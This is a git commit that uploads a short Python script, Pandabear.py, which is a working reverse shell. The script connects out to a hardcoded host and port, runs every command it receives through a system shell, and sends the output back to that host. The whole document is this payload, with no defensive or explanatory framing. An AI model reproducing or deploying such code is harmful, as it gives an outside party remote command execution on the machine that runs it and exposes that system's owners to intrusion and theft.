821d4ca6c49d6edf53d3bf7fd9065adf7c6b7f7c
GotonHackers <lottersb@outlook.de>
2016-09-19 18:24:51 +0200

    Add files via upload

---
+++ Pandabear.py
@@ -0,0 +1,24 @@
+import socket, subprocess
+HOST = '192.168.2.111'
+PORT = 443
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((HOST, PORT))
+
+s.send('[*] Connected!!!')
+
+while 1:
+
+     data = s.recv(1024)
+
+     if data == "break":
+         break;
+
+     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+     stdout_value = proc.stdout.read() + proc.stderr.read()
+
+     s.send(stdout_value)
+# close socket
+s.send("[*] Bye...")
+s.close()
